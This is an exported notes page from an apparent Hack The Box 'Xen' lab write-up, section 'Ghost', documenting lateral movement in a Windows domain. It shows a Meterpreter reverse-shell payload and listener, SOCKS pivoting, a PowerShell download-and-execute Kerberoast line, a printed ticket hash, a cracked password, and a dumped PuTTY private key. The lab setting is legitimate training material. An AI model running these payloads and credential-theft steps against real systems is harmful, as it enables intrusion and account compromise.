@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html><head><title>CTFLover hack stuff | CTF solutions</title><base href="./"/><meta id="root-path" root-path="./"/><link href="/images/favicon.jpeg" rel="icon" sizes="96x96"/><meta content="width=device-width,initial-scale=1,user-scalable=yes,minimum-scale=1,maximum-scale=5" name="viewport"/><meta charset="utf-8"/><link href="lib/styles/obsidian-styles.css" rel="stylesheet"/><link href="lib/styles/theme.css" rel="stylesheet"/><link href="lib/styles/plugin-styles.css" rel="stylesheet"/><link href="lib/styles/snippets.css" rel="stylesheet"/><link href="lib/styles/generated-styles.css" rel="stylesheet"/><style></style><script src="lib/scripts/graph_view.js" type="module"></script><script src="lib/scripts/graph_wasm.js"></script><script src="lib/scripts/tinycolor.js"></script><script crossorigin="anonymous" integrity="sha512-Ch/O6kL8BqUwAfCF7Ie5SX1Hin+BJgYH4pNjRqXdTEqMsis1TUYg+j6nnI9uduPjGaj7DN4UKCZgpvoExt6dkw==" referrerpolicy="no-referrer" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js"></script><script src="lib/scripts/webpage.js"></script><script src="lib/scripts/generated.js"></script></head><body class="theme-dark mod-linux show-inline-title loading"><div class="webpage-container"><div class="sidebar-left sidebar"><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" id="theme_toggle" type="checkbox"/><div class="toggle-background"></div></label></div><div class="tree-container file-tree mod-nav-indicator" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Xen</span><button class="clickable-icon collapse-tree-button is-collapsed"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="05-nmap.html"><span class="tree-item-title">05-Nmap</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="10-enumeration.html"><span class="tree-item-title">10-Enumeration</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="15-smtp.html"><span class="tree-item-title">15-SMTP</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="20-citrix.html"><span class="tree-item-title">20-Citrix</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="25-getting-shell.html"><span class="tree-item-title">25-Getting Shell</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="30-deploy.html"><span class="tree-item-title">30-Deploy</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="35-ghost.html"><span class="tree-item-title">35-Ghost</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="40-camouflage.html"><span class="tree-item-title">40-Camouflage</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="45-doppelgänger.html"><span class="tree-item-title">45-Doppelgänger</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="50-owned.html"><span class="tree-item-title">50-Owned</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="creds.html"><span class="tree-item-title">creds</span></a></div><div class="tree-item-children"></div></div></div></div></div></div></div></div><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div></div><div class="document-container show"><div class="markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings show-indentation-guide allow-fold-lists show-properties" style="tab-size:4" tabindex="-1"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="markdown-preview-pusher" style="width:1px;height:.1px;margin-bottom:0"></div><div class="mod-header"><div class="inline-title" data-heading="35-Ghost" id="35-Ghost" style="display:block">35-Ghost</div></div><div><p>From here on wards i need to make tunnels to move to different machines. I ll use metasploit to do this.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=443 -f exe -o rev.exe
+
+[msfconsole]
+use exploit/multi/handler
+set lhost=tun0
+set lport=443
+run
+
+.\rev.exe
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>I used the command <code>ping dc</code> and it pinged a ip<br/><span alt="Pasted image 20240121114406.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121114406.png"><img alt="Pasted image 20240121114406.png" src="pasted-image-20240121114406.png"/></span></p></div><div><p>I ll create a proxy so i can reach dc from my kali machine.<br/>I ll use <code>post/multi/manage/autoroute</code> to tell msf that it should route traffic 172.16.249.0/24 through session 3.<br/>And then i ll start the proxy.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">msf6 post(multi/manage/autoroute) &gt; options                                                                                               [33/33]
+                                                                        
+Module options (post/multi/manage/autoroute):
+                                                                        
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
+   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"                                                       
+   SESSION  3                yes       The session to run this module on 
+   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
+                                                                                                                                                 
+
+View the full module info with the info, or info -d command.
+                                    
+msf6 post(multi/manage/autoroute) &gt; sessions
+                                                                        
+Active sessions                                                         
+===============                                                                                                                                  
+                                                                                                                                                 
+  Id  Name  Type                     Information                      Connection
+  --  ----  ----                     -----------                      ----------
+  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VDESKTOP3  10.10.14.11:443 -&gt; 10.13.38.15:49525 (10.13.38.15)
+
+msf6 post(multi/manage/autoroute) &gt; set subnet 172.16.249.0/24
+subnet =&gt; 172.16.249.0/24
+msf6 post(multi/manage/autoroute) &gt; run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[*] Running module against VDESKTOP3                        
+[*] Searching for subnets to autoroute.
+[*] Did not find any new subnets to add.             
+[*] Post module execution completed
+</code><button class="copy-code-button">Copy</button></pre></div><div class="heading-wrapper"><h4 class="heading" data-heading="Start of proxy" id="Start_of_proxy"><div class="heading-before"></div><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg class="svg-icon right-triangle" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="width:24px;max-width:100%" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 8L12 17L21 8"></path></svg></div>Start of proxy<div class="heading-after">...</div></h4><div class="heading-children"><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy                                                                       [0/33]
+msf6 auxiliary(server/socks_proxy) &gt; options     
+
+Module options (auxiliary/server/socks_proxy):                          
+                                                                        
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.
+                                       0 to listen on all addresses.
+   SRVPORT  1080             yes       The port to listen on
+   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a, 5)
+
+
+   When VERSION is 5:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 listener
+   USERNAME                   no        Proxy username for SOCKS5 listener
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050
+SRVPORT =&gt; 9050
+msf6 auxiliary(server/socks_proxy) &gt; run
+[*] Auxiliary module running as background job 2.
+
+msf6 auxiliary(server/socks_proxy) &gt; [*] Starting the SOCKS proxy server
+
+</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h3 class="heading" data-heading="Kerberoasting." id="Kerberoasting."><div class="heading-before"></div><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg class="svg-icon right-triangle" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="width:24px;max-width:100%" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 8L12 17L21 8"></path></svg></div>Kerberoasting.<div class="heading-after">...</div></h3><div class="heading-children"><div><p>I was having trouble kerberoasting from my system with proxychains because the skew was too great.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  www proxychains impacket-GetUserSPNs -request -dc-ip 172.16.249.200 HTB.LOCAL/pmorgan:Summer1Summer! -save -outputfile GetUserSPNS.out
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:389  ...  OK
+ServicePrincipalName                Name     MemberOf                                 PasswordLastSet             LastLogon                   Delegation 
+----------------------------------  -------  ---------------------------------------  --------------------------  --------------------------  ----------
+MSSQLSvc/CITRIXTEST.HTB.LOCAL:1433  mturner  CN=Deployment,OU=Groups,DC=htb,DC=local  2019-02-14 03:53:48.796612  2019-04-11 01:44:57.105936             
+
+
+
+[-] CCache file is not found. Skipping...
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:88  ...  OK
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+➜  www 
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>Instead of fixing the clock skew time i performed the attack from the from pmorgan's account.</p></div><div><pre class="language-css" tabindex="0"><code class="language-css is-loaded">meterpreter &gt; powershell_import invoke-kerberoast.ps1
+meterpreter &gt; powershell_shell
+
+PS &gt; iex <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.<span class="token function">DownloadString</span><span class="token punctuation">(</span><span class="token property">‘http</span><span class="token punctuation">:</span>//<span class="token number">10.14</span><span class="token number">.14</span><span class="token number">.11</span>/Invoke-Kerberoast.ps1'<span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-Kerberoast -OutputFormat hashcat
+<span class="token property">ERROR</span><span class="token punctuation">:</span> <span class="token property">Invoke-Expression</span> <span class="token punctuation">:</span> The string <span class="token property">starting</span><span class="token punctuation">:</span>
+<span class="token property">ERROR</span><span class="token punctuation">:</span> At <span class="token property">line</span><span class="token punctuation">:</span><span class="token number">1</span> <span class="token property">char</span><span class="token punctuation">:</span><span class="token number">90</span>
+<span class="token property">ERROR</span><span class="token punctuation">:</span> <span class="token operator">+</span> iex <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.<span class="token function">DownloadString</span><span class="token punctuation">(</span>???<span class="token property">http</span><span class="token punctuation">:</span>//<span class="token number">10.14</span><span class="token number">.14</span><span class="token number">.11</span>/Invoke-Kerberoast.ps1 &lt;&lt;&lt;&lt; '<span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-Kerberoast <span class="token operator">-</span>
+<span class="token property">ERROR</span><span class="token punctuation">:</span> OutputFormat hashcat
+<span class="token property">ERROR</span><span class="token punctuation">:</span> is missing the <span class="token property">terminator</span><span class="token punctuation">:</span> '.
+<span class="token property">ERROR</span><span class="token punctuation">:</span> At <span class="token property">line</span><span class="token punctuation">:</span><span class="token number">1</span> <span class="token property">char</span><span class="token punctuation">:</span><span class="token number">4</span>
+<span class="token property">ERROR</span><span class="token punctuation">:</span> <span class="token operator">+</span> IEX &lt;&lt;&lt;&lt;  <span class="token punctuation">(</span>[System.Text.Encoding]<span class="token punctuation">:</span><span class="token punctuation">:</span>UTF8.<span class="token function">GetString</span><span class="token punctuation">(</span>[System.Convert]<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>"aWV4IChOZXctT2JqZWN0IE5ldC5XZWJ
+<span class="token property">ERROR</span><span class="token punctuation">:</span> DbGllbnQpLkRvd25sb2FkU3RyaW5nKMOi4oKsy5xodHRwOi8vMTAuMTQuMTQuMTEvSW52b2tlLUtlcmJlcm9hc3QucHMxJyk7SW52b2tlLUtlcmJlcm9hc3
+<span class="token property">ERROR</span><span class="token punctuation">:</span> QgLU91dHB1dEZvcm1hdCBoYXNoY2F0Cg=="<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token property">ERROR</span><span class="token punctuation">:</span>     <span class="token operator">+</span> <span class="token property">CategoryInfo</span>          <span class="token punctuation">:</span> <span class="token property">ParserError</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-Kerber...Format hashcat
+<span class="token property">ERROR</span><span class="token punctuation">:</span> <span class="token punctuation">:</span>String<span class="token punctuation">)</span> [Invoke-Expression]<span class="token punctuation">,</span> IncompleteParseException
+<span class="token property">ERROR</span><span class="token punctuation">:</span>     <span class="token operator">+</span> <span class="token property">FullyQualifiedErrorId</span> <span class="token punctuation">:</span> TerminatorExpectedAtEndOfString<span class="token punctuation">,</span>Microsoft.PowerShell.Commands.InvokeExpressionCommand
+<span class="token property">ERROR</span><span class="token punctuation">:</span> 
+PS &gt; iex <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.<span class="token function">DownloadString</span><span class="token punctuation">(</span><span class="token string">'http://10.14.14.11/Invoke-Kerberoast.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-Kerberoast -OutputFormat hashcat
+<span class="token property">ERROR</span><span class="token punctuation">:</span> Exception calling <span class="token string">"DownloadString"</span> with <span class="token string">"1"</span> <span class="token function">argument</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"Unable to connect to the remote server"</span>
+<span class="token property">ERROR</span><span class="token punctuation">:</span> At <span class="token property">line</span><span class="token punctuation">:</span><span class="token number">1</span> <span class="token property">char</span><span class="token punctuation">:</span><span class="token number">46</span>
+<span class="token property">ERROR</span><span class="token punctuation">:</span> <span class="token operator">+</span> iex <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString &lt;&lt;&lt;&lt; <span class="token punctuation">(</span><span class="token string">'http://10.14.14.11/Invoke-Kerberoast.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-Kerberoast -Ou
+<span class="token property">ERROR</span><span class="token punctuation">:</span> tputFormat hashcat
+<span class="token property">ERROR</span><span class="token punctuation">:</span>     <span class="token operator">+</span> <span class="token property">CategoryInfo</span>          <span class="token punctuation">:</span> <span class="token property">NotSpecified</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">:</span><span class="token punctuation">)</span> []<span class="token punctuation">,</span> MethodInvocationException
+<span class="token property">ERROR</span><span class="token punctuation">:</span>     <span class="token operator">+</span> <span class="token property">FullyQualifiedErrorId</span> <span class="token punctuation">:</span> DotNetMethodException
+<span class="token property">ERROR</span><span class="token punctuation">:</span> 
+
+
+<span class="token property">TicketByteHexStream</span>  <span class="token punctuation">:</span>
+<span class="token property">Hash</span>                 <span class="token punctuation">:</span> $krb5tgs$<span class="token number">23</span>$*mturner$htb.local$MSSQLSvc/CITRIXTEST.HTB.<span class="token property">LOCAL</span><span class="token punctuation">:</span><span class="token number">1433</span>*$<span class="token number">47</span>D8AEBB51006FB5681925A8D7D7D
+                       <span class="token number">0</span>ED$<span class="token number">002</span>A11DEA997487D40C3DABB0E1CFC6C82EC05548A307187099E5C5DE76D4D4ED693CD9D792A3752A75BF02AEFED
+                       <span class="token number">052</span>DFF1112197AAAC3F87C5CC547D8E9E640D0741C2316F2214108195ACF0FAEC03D351970C971798F49CD278665232A
+                       CDD8C5129E86E243F3FEFD45E91177B916BEB51CDFCF553F71854F8CAC1858418BB68868D5E3292DB8969DB228261AD2
+                       D5BDB4F994DB9AD72BC2147E88B9BCCA25958DD1CF1996A5E5FB81A8E5A41E08BD20F9D29DF318E90DA50DBAEFEA9C54
+                       <span class="token number">2</span>DCD22E5B16CC37CF5C12C0B1B6125693001FD68A93F44AF40409FB89C71657700FD554D1BD77DBB70738E160000DDD7
+                       <span class="token number">11522</span>E43AD63A2CC12461EE56A56E711AB986591D66C48E488F9A33F9404877894DF5FCFC5EDB28A770D64ECDDC4EA50
+                       <span class="token number">756</span>B41776775BB1A48019828CE6CCAC8D8D11CBEFAE92626A3F465E9FB558F2D82A5BDAD745862A54100D6EC974C42A4
+                       AE4F2B259E10F9C6DB55838147C8BE8D22D824A2202BE102B53178A2E68A1BFA550C2A3EFF7EEE7C85AE571A418D009A
+                       <span class="token number">9</span>B4FFD39E2154051BE50FA383031B68BD1D92FF6D483C0970884A02728EBD92CB7AEE63E5688F5C188CE5DDF177485F5
+                       EC151613EF526CF8A1B1F1E77BA43CA88646547F3C13DC50C8064C872BCCC08251B9088E66684078CF0BA298628A8F93
+                       <span class="token number">35</span>B91156831CB8D4D95FAEBAFDCC5371C2C2CC8405D2022B17D33772B068ADD0393ADB43BCAF43B817DD33D46969E1FA
+                       <span class="token number">60796</span>E67FD72AD7C8CF41AC5E3E33B0C601F499789BD37C32F8DFAE8C2E9D68DBA2F68B62D0F2FC80FE6D7E5A555D16B
+                       FC2F70FAB38CE67B2BDAFFBE41710F0414FDC5DE206D786587CBF89E5A5AE5E8C5C5F6A013F0BA30D0CF037A94E5AF3B
+                       <span class="token number">7</span>B7152F1FC35EADB8582A0B63768ACD6D8FF7D27EE73E22A289F8A3E93EA4CE3E67AFE6D720205491A3E7822E849C3EC
+                       <span class="token number">7</span>E287117938528A22F783F5FB0EE5230558553BC14D41A6B66094DC0696577DC844E0A5ADD0B41D934F149FE647439CF
+                       <span class="token number">75239</span>AC63C9B1A61F9EE661DDF838E1DC8E21B37EE15BA89A547B0A9D5B7AD935BCA4CE922B92B381D55658BB461DE61
+                       FAA6A584BA21AAEBA4324F2D1537573B6C00293F9DEE4EC93C5BC758D3C16D29CA6E6D8CBCF219FAB12D33CAACCAF882
+                       E94902C51CA2B081C84ABDA5F69E2C1778F86309B8548EE170916B13C4BD950F939559C8D149743ABF816CD2DF74E442
+                       <span class="token number">71</span>DB9CA63EE49B69008389ADC89506054C3DEA21AF770874455F09A99C91EA3F31C6970954A1E76F9734D4D76278E311
+                       FC5E47AD48AE1D158F908E1CDED8F718FC7791CDD90539DC109FBCEE92D22FE08BFC53D5A73A8B0DE7CF80DD64C9409D
+                       <span class="token number">879246</span>ECA2EB386E7AD1ED6FF304C4C2E46347551DE2B8C42C739BE3ED19787325E634E8FF8D6FC9FEA4003FDEC9808A
+<span class="token property">SamAccountName</span>       <span class="token punctuation">:</span> mturner
+<span class="token property">DistinguishedName</span>    <span class="token punctuation">:</span> CN=Mark Turner<span class="token punctuation">,</span>OU=Contractors<span class="token punctuation">,</span>DC=htb<span class="token punctuation">,</span>DC=local
+<span class="token property">ServicePrincipalName</span> <span class="token punctuation">:</span> MSSQLSvc/CITRIXTEST.HTB.<span class="token property">LOCAL</span><span class="token punctuation">:</span><span class="token number">1433</span>
+
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>It took me 2 hours to crack the hash.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  Xen hashcat hash /usr/share/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
+</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240121165218.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121165218.png"><img alt="Pasted image 20240121165218.png" src="pasted-image-20240121165218.png"/></span></p></div><div><p><code>mturner:4install!</code></p></div><div class="heading-wrapper"><h5 class="heading" data-heading="SMB Enumeration." id="SMB_Enumeration."><div class="heading-before"></div><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg class="svg-icon right-triangle" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="width:24px;max-width:100%" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 8L12 17L21 8"></path></svg></div>SMB Enumeration.<div class="heading-after">...</div></h5><div class="heading-children"><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  Xen proxychains crackmapexec smb 172.16.249.201 -u mturner -p '4install!'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.201:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.201:135  ...  OK
+SMB         172.16.249.201  445    CITRIX           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.201:445  ...  OK
+SMB         172.16.249.201  445    CITRIX           [+] htb.local\mturner:4install! 
+
+</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h4 class="heading" data-heading="SMB Enumeration from Administrators account" id="SMB_Enumeration_from_Administrators_account"><div class="heading-before"></div><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg class="svg-icon right-triangle" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="width:24px;max-width:100%" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 8L12 17L21 8"></path></svg></div>SMB Enumeration from Administrators account<div class="heading-after">...</div></h4><div class="heading-children"><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">C:\Windows\system32&gt;net view \\citrix /all
+net view \\citrix /all
+Shared resources at \\citrix
+
+
+
+Share name  Type  Used as  Comment        
+
+-------------------------------------------------------------------------------
+ADMIN$      Disk           Remote Admin   
+C$          Disk           Default share  
+Citrix$     Disk                          
+IPC$        IPC            Remote IPC     
+ISOs        Disk                          
+ISOs-TEST   Disk                          
+The command completed successfully.
+</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">C:\Windows\system32&gt;net use \\citrix\Citrix$ /u:mturner 4install!
+net use \\citrix\Citrix$ /u:mturner 4install!
+The command completed successfully.
+</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">C:\Windows\system32&gt;dir \\citrix\Citrix$
+dir \\citrix\Citrix$
+ Volume in drive \\citrix\Citrix$ has no label.
+ Volume Serial Number is 244B-E63F
+
+ Directory of \\citrix\Citrix$
+
+05/09/2019  03:42 AM    &lt;DIR&gt;          .
+05/09/2019  03:42 AM    &lt;DIR&gt;          ..
+02/13/2019  04:51 AM           997,001 Deploying-XenServer-5.6.pdf
+03/31/2019  08:55 PM                20 flag.txt
+05/09/2019  03:51 AM             1,486 private.ppk
+02/13/2019  04:51 AM         1,747,587 XenServer-5-6-SHG.pdf
+               4 File(s)      2,746,094 bytes
+               2 Dir(s)  26,007,474,176 bytes free
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>Got the flag and the ppk file.</p></div><div><pre class="language-css" tabindex="0"><code class="language-css is-loaded"><span class="token selector">C:\Windows\system32<span class="token combinator">&gt;</span>type \\citrix\Citrix$\flag<span class="token class">.txt</span>
+type \\citrix\Citrix$\flag<span class="token class">.txt</span>
+XEN</span><span class="token punctuation">{</span>l364...n5_ftw<span class="token punctuation">}</span>
+<span class="token property">C</span><span class="token punctuation">:</span>\Windows\system32&gt;type \<span class="token entity" title="\c">\c</span>itrix<span class="token entity" title="\C">\C</span>itrix$\private.ppk
+type \<span class="token entity" title="\c">\c</span>itrix<span class="token entity" title="\C">\C</span>itrix$\private.ppk
+<span class="token property">PuTTY-User-Key-File-2</span><span class="token punctuation">:</span> ssh-rsa
+<span class="token property">Encryption</span><span class="token punctuation">:</span> aes256-cbc
+<span class="token property">Comment</span><span class="token punctuation">:</span> imported-openssh-key
+<span class="token property">Public-Lines</span><span class="token punctuation">:</span> <span class="token number">6</span>
+AAAAB3NzaC1yc2EAAAADAQABAAABAQDR1rakYMB+<span class="token number">9</span>++bNXo/Rda/<span class="token number">7</span>dhII8lzQt+n
+ixND2S30rtBz+ROW/UqKqTX8lRZ3zlMFKQT514RomVq0ec6gEoKVGZQRsc+S4aaL
+AAnLp4ENGT3Gk9AeHgDxJ2eyBFnzMmO07gInwFzEPCLTT7caJAYGuMFdxgAsU6BX
+Y49Tv578krpGNz0C58V6YH+u8/AIVXfhmXdwGuY921NDUHogjRGsoxQi9jDffOx+
+zOuxfm7nMRYGDWLZO5HNjhanQt0rj9EK+<span class="token number">70</span>zJcFb1CDub9EEmwb/DDZB5zCytx90
+<span class="token number">69</span>mql7SFg7D0K1tm0LicrwZMDJuYf87P5MFdBEnsO3Oay1lsRFZz
+<span class="token property">Private-Lines</span><span class="token punctuation">:</span> <span class="token number">14</span>
+LbxnKlBkUZLxSGo2vSU375iM6kDpQuIE8S5G+azqGT0FziA/lr40gyj2IipKZqe/
+DZRbPNcrerJQDE9xg1qTqnKShjnRvUi+I5ClTvn7UrYt2HAfds/Tl61zRhJ3YXnu
+dkw3fTfo63OvBPwRpYQtpj5yFbHtUR8wY+<span class="token number">2</span>RBNcS/plU2kretGTRbZJkV9+<span class="token number">1</span>U7Vz
+Uk2JZfua5VkTuCw7DqKRoAjR28p1UKhpIoztG6MKtNtR1HeUL3y2oQbOzLNJhz0m
+F9sn/wBTdPQN5ZB76ERlH0fAugi7YeuxwFxctnUNoeA3+APH3kzeP9uRLsBwdn0r
+ayZr/yihzFMlQ7VgcjI9uE2sMnScaEk094FWuj6gjPZqoqzAWhXP/<span class="token number">71</span>VEWbOg+gj
+s6nBhJB9f4mUEHy8SOlbIK/Q3Es/VAaYiQchSXEsPhHdGC2J511TudjggmCFsCVP
+tf6mzyS+<span class="token number">8</span>SA23dE8L3V5S5/Y8IDEcvLWaxDsV6Xjd4PGBgMLp10FJYajo9m61GdB
+<span class="token number">4</span>ffBBqI5sOZK0Gb27AemRSyo0vA5EoM3YUOeKqm5xlNIalrTHI10SKD9tTC8UPLJ
+<span class="token number">1</span>fbbmJ+eQagw/PefzHQ9cavnU5x98+PjeougVBbkZBGBAqUP0cLV1hWKaOlkqHP5
++m+fLhviWCbNj2FNEFse04NNlbSBgHrF//fVQbFIbSnMsJ/BkDZ5rVxpHG8aq9my
+l9a0d97470iNp8drQKuKGRlzbe/TA8NQQaO5/My28kPbLqLcaTJKNZe8rvvU4Cj4
+n+<span class="token number">76</span>s8XHhONvtAUrULiGHyAM2aMQXwUM5rCju7t6hdpy5h8HTgdys35MRM2DdvtD
++SfIoAmXu1V1xQrQJbDlStVM9l5z6C+pzmtv26jXebl8821pI6xJJHW02dZDAskl
+<span class="token property">Private-MAC</span><span class="token punctuation">:</span> <span class="token number">27</span>a161c329fc67b51d27efcaf3221099748934a9
+</code><button class="copy-code-button">Copy</button></pre></div><div class="mod-footer"></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder"><div class="graph-view-container"><div aria-label="Expand" class="graph-icon graph-expand" data-tooltip-position="top" role="button"><svg class="svg-icon" fill="none" height="24" stroke="currentColor" 